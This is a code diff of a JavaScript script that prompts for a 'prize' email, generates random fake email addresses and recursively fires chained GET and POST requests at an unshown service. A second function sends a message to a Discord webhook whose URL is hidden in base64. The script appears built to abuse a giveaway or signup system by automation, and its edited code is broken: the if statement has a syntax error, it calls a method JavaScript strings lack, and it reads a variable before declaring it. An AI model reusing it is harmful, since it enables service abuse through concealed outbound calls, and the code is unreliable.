@@ -1,7 +1,8 @@
-function must(winEmail) {
-    if (winEmail == ""){
+function must() {
+    if (!winEmail.contains("@"){
+        console.log(winEmail)
     var winEmail = prompt("What email do you want the prize to go to?", "example@gmail.com")
-}
+    }
     const r1 = Math.floor(Math.random() * 999999) + 1;
     const r2 = Math.floor(Math.random() * 999999) + 1;
     const e = `${r1}@${r2}`;
@@ -167,37 +168,37 @@ function must(winEmail) {
                         .then(response => response.json())
                         .then(data => {
                             console.log(data);
-                            must(winEmail)
+                            must()
                         })
                         .catch(error => {
                             console.error('Error:', error);
-                            must(winEmail)
+                            must()
                         });
                       })
                       .catch(error => {
                         console.error('Error', error);
-                        must(winEmail)
+                        must()
                       });
                 } else {
-                  must(winEmail)
+                  must()
                 }
               })
               .catch(error => {
                 console.error('POST Request Error:', error);
-                must(winEmail)
+                must()
               });
           })
           .catch(error => {
             console.error('GET Request Error:', error);
-            must(winEmail)
+            must()
           });
       })
       .catch(error => {
         console.error('Error:', error);
-        must(winEmail)
+        must()
       });
   }
-  function funny(winEmail) {
+  function funny() {
     const webhookUrl = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2MTExMjIwNTQ2NzU5NDgwMy82bHRldHBQMndja1VKaGRPMGlUb2V1MEZfaUtPeWptUFBObS0zTFpaVjA1cDFpYjQxTFlRYURNT3E3TkhxaXZ2NG40aQ==';
   
     const discordMessage = {
